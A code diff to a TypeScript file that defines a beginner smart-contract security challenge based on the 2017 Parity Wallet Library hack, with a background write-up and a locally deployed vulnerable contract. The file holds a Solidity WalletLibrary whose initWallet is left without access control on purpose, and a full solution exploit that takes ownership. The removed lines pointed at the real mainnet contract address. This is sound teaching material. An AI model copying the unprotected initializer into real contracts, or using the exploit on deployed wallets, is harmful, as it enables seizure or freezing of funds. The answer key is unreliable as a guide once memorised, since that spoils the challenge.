@@ -1,85 +1,178 @@
-// src/data/vulnerabilities/access-control/parity-wallet.ts
+import type { VulnerabilityChallenge } from "@/types/vulnerability";
 
-import type { VulnerabilityProblem } from "@/types/vulnerability";
+const WALLET_LIBRARY_SOURCE = `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
-export const parityWalletHack: VulnerabilityProblem = {
+contract WalletLibrary {
+    address[] public owners;
+    uint256 public required;
+
+    function initWallet(address[] calldata _owners, uint256 _required, uint256 _dayLimit) external {
+        require(owners.length == 0, "Already initialized");
+        for (uint256 i = 0; i < _owners.length; i++) {
+            owners.push(_owners[i]);
+        }
+        required = _required;
+    }
+
+    function isOwner(address _addr) external view returns (bool) {
+        for (uint256 i = 0; i < owners.length; i++) {
+            if (owners[i] == _addr) return true;
+        }
+        return false;
+    }
+
+    function getOwners() external view returns (address[] memory) {
+        return owners;
+    }
+
+    function getRequired() external view returns (uint256) {
+        return required;
+    }
+}`;
+
+export const parityWalletChallenge: VulnerabilityChallenge = {
   id: "parity-wallet-library",
   title: "Parity Wallet Library Hack",
   category: "access-control",
   difficulty: "beginner",
 
-  fork: {
-    defaultRpc: "https://eth.llamarpc.com",
-    chainId: 1,
-    blockNumber: BigInt(4501968),
-  },
-
-  targetContract: {
-    address: "0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4",
-    name: "WalletLibrary",
-    abi: [
-      {
-        name: "initWallet",
-        type: "function",
-        inputs: [
-          { name: "_owners", type: "address[]", internalType: "address[]" },
-          { name: "_required", type: "uint256", internalType: "uint256" },
-          { name: "_dayLimit", type: "uint256", internalType: "uint256" },
-        ],
-        outputs: [],
-        stateMutability: "nonpayable",
-      },
+  incident: {
+    name: "Parity Wallet Library Hack",
+    date: "November 2017",
+    losses: "150,000 ETH (~30M USD)",
+    references: [
+      "https://medium.com/chainsecurity/parity-wallet-hack-2-analyze-the-attacks-5c9c2747a5a",
     ],
   },
 
-  description: `## 배경
+  description: `# Parity Wallet Library Hack
 
-2017년 11월, Parity Wallet Library 컨트랙트에서 치명적인 취약점이 발견되었습니다. 이 취약점으로 인해 수백 개의 멀티시그 월렛이 동결되었습니다.
+## Background
 
-## 취약점 분석
+In November 2017, a critical vulnerability was discovered in the Parity Wallet Library contract. The vulnerability allowed anyone to call the \`initWallet\` function and gain ownership of the contract.
 
-\`initWallet\` 함수가 이미 초기화된 컨트랙트에서도 호출 가능하며, 호출자 권한 검증이 누락되어 있습니다.
+## The Vulnerability
+
+The \`initWallet\` function lacks access control:
 
 \`\`\`solidity
-// 취약한 코드 구조
-function initWallet(address[] _owners, uint _required, uint _dayLimit) {
-  initWalletted(_owners, _required, _dayLimit);
-  // 권한 체크 없음!
+function initWallet(address[] _owners, uint _required, uint _dayLimit) external {
+    require(owners.length == 0, "Already initialized");
+    // No check for who can call this!
+    for (uint i = 0; i < _owners.length; i++) {
+        owners.push(_owners[i]);
+    }
+    required = _required;
 }
 \`\`\`
 
-## 목표
+Anyone can call this function before the contract is initialized and become an owner!
 
-WalletLibrary 컨트랙트의 소유권을 획득하세요.`,
+## Objective
 
-  exploitHint: "initWallet 함수를 직접 호출해보세요. 누구나 호출할 수 있습니다.",
+The \`WalletLibrary\` contract is deployed. Exploit the vulnerability to become an owner by calling \`initWallet\`.
 
-  referenceLinks: [
-    "https://medium.com/chainsecurity/parity-wallet-hack-2-analyze-the-attacks-5c9c2747a5a",
-    "https://etherscan.io/address/0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4",
+**Target**: \`WalletLibrary\` contract (address will be shown in the editor after setup)`,
+
+  starterCode: `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IWalletLibrary {
+    function initWallet(address[] calldata _owners, uint256 _required, uint256 _dayLimit) external;
+    function isOwner(address _addr) external view returns (bool);
+}
+
+contract Exploit {
+    IWalletLibrary public target;
+    address[] public owners;
+
+    constructor(address _target) {
+        target = IWalletLibrary(_target);
+    }
+
+    function attack() external {
+        // TODO: Call initWallet to make this contract an owner
+        // HINT: The initWallet function takes (address[] _owners, uint _required, uint _dayLimit)
+    }
+}`,
+
+  hint: "The initWallet function has no access control. Call it with your exploit contract address (address(this)) as the owner in the array.",
+
+  setup: {
+    contracts: [
+      {
+        name: "WalletLibrary",
+        source: WALLET_LIBRARY_SOURCE,
+      },
+    ],
+    attackerBalance: "10",
+  },
+
+  exposedFunctions: [
+    {
+      name: "owners",
+      signature: "owners(uint256)",
+      inputs: [{ name: "index", type: "uint256" }],
+      outputs: [{ name: "", type: "address" }],
+      stateMutability: "view",
+    },
+    {
+      name: "required",
+      signature: "required()",
+      inputs: [],
+      outputs: [{ name: "", type: "uint256" }],
+      stateMutability: "view",
+    },
+    {
+      name: "isOwner",
+      signature: "isOwner(address)",
+      inputs: [{ name: "_addr", type: "address" }],
+      outputs: [{ name: "", type: "bool" }],
+      stateMutability: "view",
+    },
+    {
+      name: "getOwners",
+      signature: "getOwners()",
+      inputs: [],
+      outputs: [{ name: "", type: "address[]" }],
+      stateMutability: "view",
+    },
+    {
+      name: "getRequired",
+      signature: "getRequired()",
+      inputs: [],
+      outputs: [{ name: "", type: "uint256" }],
+      stateMutability: "view",
+    },
   ],
 
   successCondition: {
-    checkStorage: {
-      address: "0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4",
-      slot: "0x0",
-      expectedValue: "owned",
+    checkOwnership: {
+      contract: "WalletLibrary",
     },
   },
 
-  solutionCode: `// SPDX-License-Identifier: MIT
-pragma solidity ^0.4.24;
+  solution: `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IWalletLibrary {
+    function initWallet(address[] calldata _owners, uint256 _required, uint256 _dayLimit) external;
+    function isOwner(address _addr) external view returns (bool);
+}
 
 contract Exploit {
-    address target = 0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4;
+    IWalletLibrary public target;
+    address[] public owners;
+
+    constructor(address _target) {
+        target = IWalletLibrary(_target);
+    }
 
     function attack() external {
-        target.call(abi.encodeWithSignature(
-            "initWallet(address[],uint256,uint256)",
-            [address(this)],
-            1,
-            0
-        ));
+        address[] memory newOwners = new address[](1);
+        newOwners[0] = address(this);
+        target.initWallet(newOwners, 1, 0);
     }
 }`,
 };
